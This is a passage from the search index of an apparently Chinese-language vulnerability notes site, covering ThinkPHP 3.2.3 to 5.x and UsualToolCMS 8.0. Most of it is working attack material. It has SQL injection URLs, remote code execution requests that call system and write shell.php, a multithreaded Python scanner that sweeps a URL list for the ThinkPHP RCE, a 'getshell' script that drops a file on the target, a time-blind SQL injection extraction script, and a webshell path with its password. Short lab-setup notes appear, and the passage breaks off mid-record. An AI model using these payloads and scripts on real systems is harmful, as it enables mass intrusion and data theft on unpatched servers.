%0a\u4e3a\u6362\u884c\u7b26\uff0c\u9ed8\u8ba4\u5b58\u5165\u7f13\u5b58\u6587\u4ef6\u65f6\u7528\u6237\u53c2\u6570\u5b58\u5728\u4e8e\u6ce8\u91ca\u4e2d\u3002","title":"\u7528\u6237\u4f20\u53c2\u6570\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#md5","text":"md5(name)","title":"\u5199\u5165\u7f13\u5b58\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3amd5\u52a0\u5bc6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_5","text":"<domain>/Application/Runtime/Temp/<md5>.php","title":"\u6587\u4ef6\u9ed8\u8ba4\u8def\u5f84"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_6","text":"http://xxxxxxx/Application/Runtime/Temp/<md5>.php \u5bc6\u7801aaa","title":"\u83dc\u5200\u8fde\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.0 <= ThinkPHP <= 5.0.21 5.1.3 <= ThinkPHP <= 5.1.25 \u6f0f\u6d1ePOC \u00b6 5.0.0~5.0.21 \u3001 5.1.3\uff5e5.1.10 http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 ** 5.1.11\uff5e5.1.25 http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23","title":"Thinkphp 5.0.(0-21)&5.1.(3-25)sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.0 <= ThinkPHP <= 5.0.21 5.1.3 <= ThinkPHP <= 5.1.25","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%280-21%29%265.1.%283-25%29sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"5.0.0~5.0.21 \u3001 5.1.3\uff5e5.1.10 http://********/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 ** 5.1.11\uff5e5.1.25 http://********/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.13<=ThinkPHP<=5.0.15 5.1.0<=ThinkPHP<=5.1.5 \u6f0f\u6d1ePOC \u00b6 \u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://*********/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1","title":"Thinkphp 5.0.(13-15)&5.1.(0-5) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.13<=ThinkPHP<=5.0.15 5.1.0<=ThinkPHP<=5.1.5","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%2813-15%29%265.1.%280-5%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://*********/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30 \u6f0f\u6d1ePOC \u00b6 POC","title":"Thinkphp 5.0.(7-22)&5.1.(0-30)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.%287-22%29%265.1.%280-30%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 ThinkPHP=5.0.10 \u6f0f\u6d1ePOC \u00b6","title":"Thinkphp 5.0.10 sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"ThinkPHP=5.0.10","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 thinkphp5\u6846\u67b6\u7f3a\u9677\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 2018-10-10 unknown http://www.thinkphp.cn/ \u4e0b\u8f7d\u8fde\u63a5 5.x < 5.1.31, <= 5.0.23 \u8be6\u60c5 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e poc \u00b6 http://192.168.99.98:7878/?s=index/\\think\\Request/input & filter=phpinfo & data=1 http://192.168.99.98:7878/?s=index/\\think\\Request/input & filter=system & data=id http://192.168.99.98:7878/?s=index/\\think\\template\\driver\\file/write &cacheFile=shell.php&content=%3C?php%20phpinfo(); ?%3E http://192.168.99.98:7878/?s=index/\\think\\view\\driver\\Php/display &content=%3C?php%20phpinfo(); ?%3E http://192.168.99.98:7878/?s=index/\\think\\app/invokefunction & function=call_user_func_array & vars[0]=phpinfo & vars[1][]=1 http://192.168.99.98:7878/?s=index/\\think\\app/invokefunction & function=call_user_func_array & vars[0]=system & vars[1][]=id http://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction & function=call_user_func_array & vars[0]=phpinfo & vars[1][]=1 http://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction & function=call_user_func_array & vars[0]=system & vars[1][]=id","title":"Thinkphp 5.1.( 31)&5.0.( 23)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 thinkphp5\u6846\u67b6\u7f3a\u9677\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 2018-10-10 unknown http://www.thinkphp.cn/ \u4e0b\u8f7d\u8fde\u63a5 5.x < 5.1.31, <= 5.0.23 \u8be6\u60c5","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","text":"\u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%28-31%29%265.0.%28-23%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","text":"http://192.168.99.98:7878/?s=index/\\think\\Request/input & filter=phpinfo & data=1 http://192.168.99.98:7878/?s=index/\\think\\Request/input & filter=system & data=id http://192.168.99.98:7878/?s=index/\\think\\template\\driver\\file/write &cacheFile=shell.php&content=%3C?php%20phpinfo(); ?%3E http://192.168.99.98:7878/?s=index/\\think\\view\\driver\\Php/display &content=%3C?php%20phpinfo(); ?%3E http://192.168.99.98:7878/?s=index/\\think\\app/invokefunction & function=call_user_func_array & vars[0]=phpinfo & vars[1][]=1 http://192.168.99.98:7878/?s=index/\\think\\app/invokefunction & function=call_user_func_array & vars[0]=system & vars[1][]=id http://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction & function=call_user_func_array & vars[0]=phpinfo & vars[1][]=1 http://192.168.99.98:7878/?s=index/\\think\\Container/invokefunction & function=call_user_func_array & vars[0]=system & vars[1][]=id","title":"poc"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.1.16 <= ThinkPHP <= 5.1.22 \u6f0f\u6d1ePOC \u00b6 http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1","title":"Thinkphp 5.1.(16-22) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.1.16 <= ThinkPHP <= 5.1.22","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%2816-22%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 5.1.6<=ThinkPHP<=5.1.7 \u975e\u6700\u65b0\u72485.1.8 \u6f0f\u6d1ePOC \u00b6 \u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://********/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0","title":"Thinkphp 5.1.(6-8) sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.1.6<=ThinkPHP<=5.1.7 \u975e\u6700\u65b0\u72485.1.8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.1.%286-8%29%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u6ca1\u5f00\u542fdebug\u770b\u4e0d\u5230\u62a5\u9519\u4fe1\u606f``` http://********/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/","text":"\u5b89\u88c5docker\u73af\u5883 \u00b6 \u70b9\u51fb\u67e5\u770b\u6559\u7a0b \u00b6 \u4e0b\u8f7dvulhub\u9879\u76ee \u00b6 \u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080** \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#docker","text":"","title":"\u5b89\u88c5docker\u73af\u5883"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_1","text":"","title":"\u70b9\u51fb\u67e5\u770b\u6559\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#vulhub","text":"\u9879\u76ee\u5730\u5740\uff1a https://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668**ip:8080**","title":"\u4e0b\u8f7dvulhub\u9879\u76ee"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_2","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 5.0.0 <= Thinkphp <= 5.0.18 5.1.0 <= ThinkPHP <= 5.1.10 \u6f0f\u6d1ePOC \u00b6 http://**********/index/index/index?cacheFile=1.jpg","title":"Thinkphp5\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","text":"5.0.0 <= Thinkphp <= 5.0.18 5.1.0 <= ThinkPHP <= 5.1.10","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5.X%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","text":"http://**********/index/index/index?cacheFile=1.jpg","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/","text":"thinkphp5\u547d\u4ee4\u6267\u884c \u00b6 POC\u68c0\u6d4b\u4ee3\u7801 \u00b6 # -*- coding:UTF-8 -*- # evn :python2 import requests import threading import time import sys class check ( threading . Thread ): #\u5224\u65ad\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6267\u884c\u51fd\u6570 def __init__ ( self , url , sem ): super ( check , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . url = url self . sem = sem def run ( self ): parameters = \"s=index/ \\\\ think \\\\ app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\" try : responce = requests . get ( url = self . url , params = parameters , timeout = 3 ) body = responce . text if body . find ( 'PHP Extension' ) != - 1 : with open ( \"success.txt\" , \"a+\" ) as f1 : f1 . write ( \"\u5b58\u5728tp5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e: \" + self . url + \" \\n \" ) print ( \"[+] \" + self . url ) else : print ( \"[-] \" + self . url ) except Exception , err : print ( \"connect failed\" ) pass self . sem . release () #\u6267\u884c\u5b8c\u51fd\u6570\uff0c\u91ca\u653e\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u6570\u52a01 class host ( threading . Thread ): #\u904d\u5386\u6587\u4ef6\u64cd\u4f5c def __init__ ( self , sem ): super ( host , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . sem = sem def run ( self ): with open ( \"url.txt\" , \"r\" ) as f : for host in f . readlines (): self . sem . acquire () #\u904d\u5386\u4e00\u4e2a\u5c31\u83b7\u5f97\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u6700\u5927 host = host . strip () + \"/public/index.php\" host_thread = check ( host , self . sem ) host_thread . start () #\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570 if __name__ == '__main__' : sem = threading . Semaphore ( 10 ) #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a thread = host ( sem ) #\u4f20\u9012sem\u503c thread . start () \u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./url.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002","title":"Thinkphp5\u547d\u4ee4\u6267\u884c\u6279\u91cf\u9a8c\u8bc1\u811a\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/#thinkphp5","text":"","title":"thinkphp5\u547d\u4ee4\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/#poc","text":"# -*- coding:UTF-8 -*- # evn :python2 import requests import threading import time import sys class check ( threading . Thread ): #\u5224\u65ad\u662f\u5426\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6267\u884c\u51fd\u6570 def __init__ ( self , url , sem ): super ( check , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . url = url self . sem = sem def run ( self ): parameters = \"s=index/ \\\\ think \\\\ app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\" try : responce = requests . get ( url = self . url , params = parameters , timeout = 3 ) body = responce . text if body . find ( 'PHP Extension' ) != - 1 : with open ( \"success.txt\" , \"a+\" ) as f1 : f1 . write ( \"\u5b58\u5728tp5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e: \" + self . url + \" \\n \" ) print ( \"[+] \" + self . url ) else : print ( \"[-] \" + self . url ) except Exception , err : print ( \"connect failed\" ) pass self . sem . release () #\u6267\u884c\u5b8c\u51fd\u6570\uff0c\u91ca\u653e\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u6570\u52a01 class host ( threading . Thread ): #\u904d\u5386\u6587\u4ef6\u64cd\u4f5c def __init__ ( self , sem ): super ( host , self ) . __init__ () #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__() self . sem = sem def run ( self ): with open ( \"url.txt\" , \"r\" ) as f : for host in f . readlines (): self . sem . acquire () #\u904d\u5386\u4e00\u4e2a\u5c31\u83b7\u5f97\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u6700\u5927 host = host . strip () + \"/public/index.php\" host_thread = check ( host , self . sem ) host_thread . start () #\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570 if __name__ == '__main__' : sem = threading . Semaphore ( 10 ) #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a thread = host ( sem ) #\u4f20\u9012sem\u503c thread . start () \u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./url.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002","title":"POC\u68c0\u6d4b\u4ee3\u7801"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Thinkphp <= 3.2.3 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 /index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))","title":"Thinkphp"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/#_1","text":"Thinkphp <= 3.2.3","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp%203.2.3RCE%E6%BC%8F%E6%B4%9E/#poc","text":"/index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/thinkphp_5.0.x%E9%80%9A%E6%9D%80gethell/","text":"# thinkphp 5.0.* \u901a\u6740getshell poc_1 import requests def post_command(host): headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = { \"_method\": \"__construct\", \"filter[]\": \"system\", \"method\": \"get\", \"server[REQUEST_METHOD]\": \"echo 202cb962ac59075b964b07152d234b70 > 11.php\" } target = host + \"/public/index.php?s=captcha\" print(\"Request: {}\".format(target)) r = requests.post(target, data=data, headers=headers) return True # \u9a8c\u8bc1 11.php\u662f\u5426\u5b58\u5728 def md5_file_is_exist(host): rs = requests.get(host+\"/public/11.php\") if rs.status_code == 200 and \"202cb962ac59075b964b07152d234b70\" in rs.text: return True class Exploit(object): def attack(self, url): post_command(url) if md5_file_is_exist(url): return \"getshell ok. {}\".format(url+\"/public/11.php\")","title":"Thinkphp 5.0.x\u901a\u6740gethell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","text":"0x01 \u6f0f\u6d1e\u73af\u5883 \u00b6 \u7248\u672c\u4fe1\u606f\uff1aUsualToolCMS-8.0-Release \u7248\u672c\u4e0b\u8f7d\uff1a http://www.a5xiazai.com/php/140604.html \u5b98\u7f51\u4e0b\u8f7d\uff1a https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip 0x02 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5728./cmsadmin/a_templetex.php\u6587\u4ef6\u7b2c137\u884c\uff0cpaths\u53d8\u91cf\u6ca1\u6709\u8fc7\u6ee4\uff0c136\u884c\u4eceget\u5904\u83b7\u53d6paths\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4: \u5f53\u4eceget\u5904\u83b7\u5f97\u7684t\u7b49\u4e8eopen\u65f6\u5c31\u53ef\u4ee5\u51fa\u53d1\u8fd9\u4e2asql\u6ce8\u5165\uff0c\u5728\u6587\u4ef6\u7b2c129\u884c: \u6784\u9020payload\uff1a Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+ \u7531\u4e8e\u662f\u65f6\u95f4\u76f2\u6ce8\uff0c\u7f16\u5199\u5ef6\u8fdf\u6ce8\u5165\u811a\u672c: Copy# -*- coding:utf-8 -*- import time import requests session = requests.session() headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'} img_url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720' img_req = session.get(url=img_url,headers=headers).content with open('pic.png','wb') as f: f.write(img_req) code = input('\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801\uff1a') data = { 'uuser':'admin', 'upass':'admin', 'ucode':code } payloads = list('root@localhostasfafsasf') url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login' response = session.post(url=url,headers=headers,data=data) res_url_1 = \"http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),{},1))={},sleep(5),1)--+\" result = '' for i in range(1,15): for payload in payloads: res_url_2 = res_url_1.format(str(i),ord(payload)) start_time = time.time() response = session.get(url=res_url_2,headers=headers) if time.time() - start_time > 7: result = result + payload print(result) break \u7206\u6570\u636e\u5e93\u8868payload\uff1a Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>0,sleep(5),1)--+ ----------------------------------------------------------------------------","title":"UsualToolCMS 8.0 